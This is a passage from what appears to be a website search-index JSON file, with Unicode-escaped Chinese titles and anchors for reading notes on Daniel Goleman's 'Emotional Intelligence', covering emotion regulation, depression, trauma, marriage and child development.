\u6709\u6c27\u8fd0\u52a8\u4f1a\u964d\u4f4e\u6291\u90c1\u7684\u7a0b\u5ea6 \u4e0e\u6bcd\u5a74\u6700\u50cf\u7684\u534f\u8c03\u662f\u505a\u7231 \u4e0e\u751f\u4ff1\u6765\u7684\u6c14\u8d28 \u77e5\u8bc6\u5de5\u4eba\u534f\u8c03\u5de5\u4f5c\u624d\u80fd\u6709\u751f\u4ea7\u529b\uff08\u5f7c\u5f97\u5fb7\u9c81\u514b\uff09 \u91cd\u73b0\u521b\u4f24\u7684\u573a\u666f\u662f\u6cbb\u7597\u521b\u4f24\u7684\u65b9\u6cd5 \u91cd\u73b0\u521b\u4f24\u7684\u6e38\u620f \u6ce8\u610f\u529b\u7684\u9ad8\u5ea6\u96c6\u4e2d\u53eb\u6d8c\u6d41 \u81ea\u52a8\u60f3\u6cd5\u7684\u5371\u5bb3 \u7ec4\u7ec7\u80fd\u529b\u548c\u534f\u5546\u89e3\u51b3\u80fd\u529b \u8111\u524d\u989d","title":"\u300a\u60c5\u5546\u300b\u4e39\u5c3c\u5c14\u00b7\u6208\u5c14\u66fc\u2014\u2014\u7b14\u8bb0"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_1","text":"","title":"\u4eba\u7684\u56db\u79cd\u667a\u80fd"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_2","text":"","title":"\u7231\u60c5\u7684\u5173\u952e\u662f\u60c5\u5546"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_3","text":"","title":"\u7231\u60c5\u60c5\u5546\u8d77\u6e90\u4e8e\u513f\u7ae5\u671f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_4","text":"","title":"\u516b\u9762\u73b2\u73d1\u7684\u4eba\u9700\u8981\u53d6\u5f97\u5e73\u8861\u81ea\u8eab\u7684\u611f\u53d7"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_5","text":"","title":"\u628a\u70e6\u607c\u7684\u60f3\u6cd5\u8bf4\u51fa\u6765\uff0c\u6709\u52a9\u4e8e\u51cf\u8f7b\u538b\u529b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_6","text":"","title":"\u6446\u8131\u6291\u90c1\u7684\u9014\u5f84"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_7","text":"","title":"\u5e2e\u52a9\u522b\u4eba\u53ef\u4ee5\u6446\u8131\u6291\u90c1"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_8","text":"","title":"\u5e2e\u52a9\u8c03\u8282\u4e0d\u5b89\u7684\u60c5\u7eea\u53ef\u4ee5\u9884\u9632\u75be\u75c5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_9","text":"","title":"\u62b1\u6028\u548c\u4eba\u8eab\u653b\u51fb\u7684\u533a\u522b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_10","text":"","title":"\u60b2\u4f24\u4f1a\u4f7f\u5fc3\u529b\u4e0b\u964d\uff0c\u4f1a\u5931\u53bb\u5bf9\u5f88\u591a\u4e8b\u60c5\u7684\u5174\u8da3"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_11","text":"","title":"\u60b2\u4f24\u79ef\u6781\u7684\u4e00\u9762"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_12","text":"","title":"\u5982\u4f55\u6b63\u786e\u5904\u7406\u88ab\u6279\u8bc4"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_13","text":"","title":"\u66b4\u529b\u884c\u4e3a\u4f1a\u4f7f\u4eba\u4e0d\u5728\u503c\u5f97\u4fe1\u4efb"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_14","text":"","title":"\u6d88\u9664\u6124\u6012\u7684\u4e00\u79cd\u65b9\u6cd5\u5c31\u662f\u4e0d\u518d\u60f3\u300e\u6124\u6012\u7684\u539f\u56e0\u300f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_15","text":"","title":"\u4e0d\u5584\u4e8e\u5904\u7406\u5b69\u5b50\u7684\u60c5\u7eea\u7684\u4e09\u79cd\u60c5\u51b5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_16","text":"","title":"\u901a\u8fc7\u4f7f\u611f\u5b98\u6109\u60a6\u53ef\u4ee5\u6d88\u9664\u6109\u60a6"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_17","text":"","title":"\u521b\u4f24\u7684\u5e94\u6fc0"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_18","text":"","title":"\u521b\u4f24\u7684\u5e94\u6fc0\u53ef\u4ee5\u6cbb\u7597"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_19","text":"","title":"\u521b\u4f24\u540e\u679c"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_20","text":"","title":"\u521b\u4f24\u6062\u590d\u7684\u4e09\u4e2a\u9636\u6bb5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_21","text":"","title":"\u9519\u8bef\u7684\u6279\u8bc4\u65b9\u5f0f\uff0c\u6279\u8bc4\u4e0d\u5e94\u8be5\u8868\u73b0\u4e3a\u4eba\u8eab\u653b\u51fb"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_22","text":"","title":"\u6253\u626e\u81ea\u5df1\u4e5f\u80fd\u4f7f\u81ea\u5df1\u6446\u8131\u6291\u90c1"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_23","text":"","title":"\u60c5\u7eea\u4e60\u60ef\u517b\u6210\u7684\u5173\u952e\u65f6\u671f\u662f\u5c11\u5e74\u671f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_24","text":"","title":"\u5927\u8111\u76ae\u5c42\u5e2e\u52a9\u6446\u8131\u56f0\u6270\u60c5\u7eea"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_25","text":"","title":"\u5927\u8111\u4e00\u751f\u90fd\u662f\u53ef\u5851\u7684"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_26","text":"","title":"\u5927\u7b11\u53ef\u4ee5\u4f7f\u4eba\u66f4\u52a0\u806a\u660e"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_27","text":"","title":"\u8c03\u8282\u4ed6\u4eba\u7684\u60c5\u7eea\u662f\u5904\u7406\u4eba\u673a\u5173\u7cfb\u7684\u6838\u5fc3"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_28","text":"","title":"\u5bf9\u5a5a\u59fb\u7684\u5fe0\u544a"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_29","text":"","title":"\u591a\u5f69\u5149\u8c31\u9879\u76ee\u53ef\u4ee5\u9884\u6d4b\u51fa\u5b69\u5b50\u5728\u54ea\u65b9\u9762\u66f4\u52a0\u6709\u5929\u8d4b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_30","text":"","title":"\u6076\u52a3\u7684\u884c\u4e3a\u66b4\u529b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_31","text":"","title":"\u4e0b\u5c5e\u7684\u5927\u591a\u6570\u884c\u4e3a\u4e0d\u662f\u7a81\u7136\u51fa\u73b0\u7684"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_32","text":"","title":"\u5bf9\u6297\u5fe7\u8651\u7684\u65b9\u6cd5\u662f\u8d28\u7591\u5fe7\u8651"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_33","text":"","title":"\u793e\u4ea4\u7f51\u7edc\u4e2d\u7684\u975e\u6b63\u5f0f\u7f51\u7edc\u7684\u91cd\u8981\u6027"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_34","text":"","title":"\u6124\u6012\u7684\u60c5\u7eea\u5bf9\u5fc3\u810f\u6700\u4e0d\u597d"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_35","text":"","title":"\u4eba\u9047\u5230\u5371\u9669\u7684\u53cd\u5e94"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_36","text":"","title":"\u8d1f\u9762\u60c5\u7eea\u5bf9\u8eab\u4f53\u7684\u5f71\u54cd"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_37","text":"","title":"\u6539\u53d8\u504f\u89c1\u6bd4\u6539\u53d8\u4fe1\u5ff5\u8fd8\u96be"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_38","text":"","title":"\u6539\u53d8\u6c14\u8d28"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_39","text":"","title":"\u9ad8\u6210\u5c31\u8005\u548c\u4f4e\u6210\u5c31\u8005\u82b1\u8d39\u5728\u65e0\u804a\u65f6\u95f4\u76f8\u540c"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_40","text":"","title":"\u9ad8\u60c5\u5546\u7537\u548c\u5973\u533a\u522b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_41","text":"","title":"\u9ad8\u667a\u5546\u7c7b\u578b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_42","text":"","title":"\u7ed9\u5a5a\u59fb\u7684\u5efa\u8bae"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_43","text":"","title":"\u8fc7\u5ea6\u538b\u529b\u548c\u7126\u8651\u5bfc\u81f4\u514d\u75ab\u529b\u5730\u4e0b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_44","text":"","title":"\u8fc7\u591a\u7684\u54ed\u6ce3\u4e0d\u5229\u4e8e\u8fdc\u79bb\u60b2\u4f24"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_45","text":"","title":"\u5b69\u5b50\u901a\u8fc7\u8bbe\u6cd5\u52a0\u5165\u522b\u7684\u5b69\u5b50\u6b63\u5728\u73a9\u7684\u6e38\u620f\uff0c\u53ef\u4ee5\u953b\u70bc\u9006\u60c5\u5546"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_46","text":"","title":"\u5b69\u5b50\u5728\u5bb6\u5b66\u4f1a\u6b66\u529b\u7684\u574f\u5904"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_47","text":"","title":"\u4e0d\u8981\u5bb3\u6015\u6ca1\u6709\u4eba\u5bf9\u81ea\u5df1\u7684\u8bdd\u611f\u5174\u8da3"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_48","text":"","title":"\u597d\u5fc3\u60c5\u7684\u4fc3\u8fdb\u4f5c\u7528"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_49","text":"","title":"\u5a5a\u59fb\u51fa\u73b0\u5371\u673a\u7684\u4fe1\u53f7\u662f\u5c16\u9510\u7684\u6279\u8bc4"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_50","text":"","title":"\u5a5a\u59fb\u4e2d\u5bf9\u7537\u4eba\u7684\u5efa\u8bae"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_51","text":"","title":"\u5a5a\u59fb\u4e2d\u5bf9\u5973\u4eba\u7684\u5efa\u8bae"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_52","text":"","title":"\u5bc2\u5bde\u5371\u5bb3\u5065\u5eb7"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_53","text":"","title":"\u4e0d\u53d7\u6b22\u8fce\u7684\u5b69\u5b50\u5bb9\u6613\u72af\u7684\u9519\u8bef"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_54","text":"","title":"\u52a0\u5165\u65b0\u56e2\u4f53\u7684\u89c4\u5219"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_55","text":"","title":"\u5bb6\u5ead\u66b4\u529b\u4fc3\u6b8b\u540c\u7406\u5fc3"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_56","text":"","title":"\u51cf\u8f7b\u6291\u90c1\u7684\u65b9\u6cd5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_57","text":"","title":"\u8fdb\u5165\u6d8c\u6d41\u65f6\uff0c\u4efb\u52a1\u662f\u7a0d\u7a0d\u8d85\u8fc7\u4eba\u7684\u80fd\u529b\u8303\u56f4"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_58","text":"","title":"\u5f00\u5fc3\u7684\u529b\u91cf"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_59","text":"\u63a7\u5236\u6124\u6012\u7684\u65b9\u6cd52","title":"\u63a7\u5236\u6124\u6012\u7684\u65b9\u6cd5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_60","text":"","title":"\u4e50\u89c2\u7684\u6fc0\u52b1\u4f5c\u7528\u662f\u6700\u660e\u663e\u7684"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_61","text":"","title":"\u4e50\u89c2\u548c\u5e0c\u671b\u662f\u53ef\u4ee5\u540e\u5929\u5b66\u4e60\u7684"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_62","text":"","title":"\u7406\u89e3\u53d7\u8650\u513f\u7ae5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#1","text":"","title":"\u60c5\u7eea\u5bf9\u5b9d\u5b9d\u7684\u5f71\u54cd1"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#2","text":"","title":"\u60c5\u7eea\u5bf9\u5b9d\u5b9d\u7684\u5f71\u54cd2"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_63","text":"","title":"\u514d\u75ab\u7cfb\u7edf\u4e5f\u6709\u5b66\u4e60\u80fd\u529b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_64","text":"","title":"\u9762\u5bf9\u56f0\u96be\u7684\u65b9\u6cd5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_65","text":"","title":"\u660e\u661f\u5de5\u7a0b\u5e08\u7684\u7279\u70b9"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_66","text":"","title":"\u7537\u4eba\u6bd4\u5973\u4eba\u5728\u5a5a\u59fb\u4e2d\u76f2\u76ee\u4e50\u89c2"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_67","text":"","title":"\u7537\u4eba\u66f4\u9700\u8981\u5173\u6000"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_68","text":"","title":"\u5973\u6027\u83b7\u5f97\u60c5\u7eea\u4fe1\u606f\u673a\u4f1a\u8981\u591a\u4e8e\u7537\u5b69"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_69","text":"","title":"\u7537\u6027\u548c\u5973\u6027\u5bf9\u4e8e\u5b64\u7acb\u7684\u5f71\u54cd"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_70","text":"","title":"\u7537\u6027\u6d88\u9664\u6124\u6012\u7684\u65b9\u6cd5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_71","text":"","title":"\u80fd\u5e2e\u52a9\u4ed6\u4eba\u8212\u7f13\u60c5\u7eea\u7684\u4eba\u7279\u522b\u53d7\u6b22\u8fce"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_72","text":"","title":"\u5973\u5b69\u548c\u7537\u5b69\u5728\u56e2\u4f53\u4e2d\u7684\u533a\u522b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_73","text":"","title":"\u5973\u5b69\u5b50\u66f4\u52a0\u5584\u4e8e\u975e\u8bed\u8a00\u7684\u60c5\u7eea\u8868\u8fbe"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_74","text":"\u914d\u5076\u4e4b\u95f4\u751f\u7406\u6c34\u5e73\u540c\u6b65\u9ad8\uff0c\u540c\u7406\u5fc3\u51c6\u786e\u5ea6\u6700\u9ad8","title":"\u5973\u6027\u53d7\u5230\u7684\u60c5\u7eea\u6ce2\u52a8\u5c0f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_75","text":"","title":"\u6279\u8bc4\u4e0d\u5e94\u8be5\u5e26\u6709\u4eba\u683c\u65b9\u9762\u7684\u653b\u51fb"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#1_1","text":"","title":"\u6279\u8bc4\u7684\u5efa\u8bae1"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#2_1","text":"","title":"\u6279\u8bc4\u7684\u5efa\u8bae2"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_76","text":"","title":"\u504f\u89c1\u7684\u6839\u6e90"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#1_2","text":"","title":"\u4e03\u9879\u80fd\u529b1"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#2_2","text":"","title":"\u4e03\u9879\u80fd\u529b2"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_77","text":"","title":"\u4f01\u4e1a\u6279\u8bc4\u4e5f\u4f1a\u9020\u6210\u60c5\u7eea\u6cdb\u6ee5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_78","text":"","title":"\u6c14\u8d28\u53ef\u4ee5\u6539\u53d8"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_79","text":"","title":"\u9752\u5c11\u5e74\u7684\u95ee\u9898"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_80","text":"","title":"\u8f7b\u8511\u7684\u4e25\u91cd\u540e\u679c"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_81","text":"","title":"\u60c5\u5546\u5305\u62ec\u54ea\u4e9b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_82","text":"","title":"\u60c5\u5546\u7684\u91cd\u8981\u6027"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_83","text":"","title":"\u60c5\u5546\u548c\u667a\u5546\u7684\u5173\u7cfb"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_84","text":"","title":"\u60c5\u7eea\u7684\u63a7\u5236"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_85","text":"","title":"\u60c5\u7eea\u7684\u4f5c\u7528"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_86","text":"","title":"\u60c5\u7eea\u8c03\u8282\u514d\u75ab\u7cfb\u7edf"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_87","text":"","title":"\u60c5\u7eea\u6cdb\u6ee5"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_88","text":"","title":"\u60c5\u7eea\u6cdb\u6ee5\u628a\u6240\u6709\u7684\u53ef\u80fd\u90fd\u770b\u7684\u65e0\u6cd5\u4fee\u590d"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_89","text":"","title":"\u60c5\u7eea\u6cdb\u6ee5\u7684\u7ed3\u679c"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_90","text":"","title":"\u60c5\u7eea\u611f\u67d3"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_91","text":"","title":"\u60c5\u7eea\u5171\u821e"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_92","text":"","title":"\u60c5\u7eea\u548c\u601d\u8003\u7684\u5173\u7cfb"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#2_3","text":"","title":"\u60c5\u7eea\u548c\u601d\u8003\u7684\u5173\u7cfb2"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_93","text":"","title":"\u60c5\u7eea\u7a7a\u767d"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_94","text":"","title":"\u60c5\u7eea\u76f2\u662f\u6240\u6709\u513f\u7ae5\u5171\u540c\u7684\u96be\u5173"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_95","text":"","title":"\u60c5\u7eea\u7834\u574f\u5fc3\u667a"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_96","text":"","title":"\u60c5\u7eea\u5931\u63a7\u7684\u539f\u56e0"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_97","text":"\u60c5\u7eea\u662f\u53ef\u4ee5\u4f20\u67d3\u7684","title":"\u60c5\u7eea\u5931\u63a7\u6d89\u53ca\u7684\u4e24\u79cd\u673a\u5236"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_98","text":"","title":"\u60c5\u7eea\u518d\u5b66\u4e60"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_99","text":"","title":"\u5fc3\u7406\u6cbb\u7597\u4e0e\u836f\u7269\u6cbb\u7597\u6548\u679c\u4e00\u6837"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_100","text":"","title":"\u60c5\u7eea\u667a\u529b\u5904\u4e8e\u4e3b\u5bfc\u5730\u4f4d"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_101","text":"","title":"\u60c5\u7eea\u667a\u529b\u7684\u4e94\u79cd\u9886\u57df"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_102","text":"","title":"\u60c5\u7eea\u667a\u529b\u5728\u7ae5\u5e74\u671f\u6709\u5173\u952e\u7684\u65f6\u671f"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_103","text":"","title":"\u60c5\u7eea\u95ee\u9898\u7684\u8eaf\u4f53\u5316"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_104","text":"","title":"\u7fa4\u4f53\u667a\u529b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_105","text":"","title":"\u70ed\u60c5\u81ea\u4fe1\u5bf9\u63d0\u9ad8\u6210\u5c31\u6709\u5f15\u5bfc\u4f5c\u7528"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_106","text":"","title":"\u4eba\u7684\u7279\u8d28\u90fd\u53ef\u4ee5\u6539\u53d8"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_107","text":"","title":"\u4eba\u9645\u8054\u7cfb\u548c\u793e\u4f1a\u5206\u6790"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_108","text":"","title":"\u4eba\u9645\u667a\u80fd\u7684\u56db\u79cd\u80fd\u529b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_109","text":"","title":"\u4eba\u4f53\u7684\u514d\u75ab\u7cfb\u7edf\u50cf\u4eba\u8111\u4e00\u6837\u5177\u6709\u5b66\u4e60\u80fd\u529b"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_110","text":"","title":"\u4eba\u6709\u4e09\u5927\u8d1f\u9762\u60c5\u7eea"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_111","text":"","title":"\u4efb\u610f\u6253\u5b69\u5b50\u4f1a\u504f\u6267\u548c\u597d\u6597"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_112","text":"","title":"\u5982\u679c\u5fc3\u7406\u9700\u6c42\u4e0e\u5176\u533b\u7597\u9700\u6c42\u534f\u8c03\u4e00\u81f4"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_113","text":"","title":"\u8f6f\u7cd6\u5b9e\u9a8c"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_114","text":"","title":"\u4e09\u79cd\u7f51\u7edc"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/#_115","text":"","title":"\u793e\u4ea4\u7ade\u4e89\u529b"},{"location":"so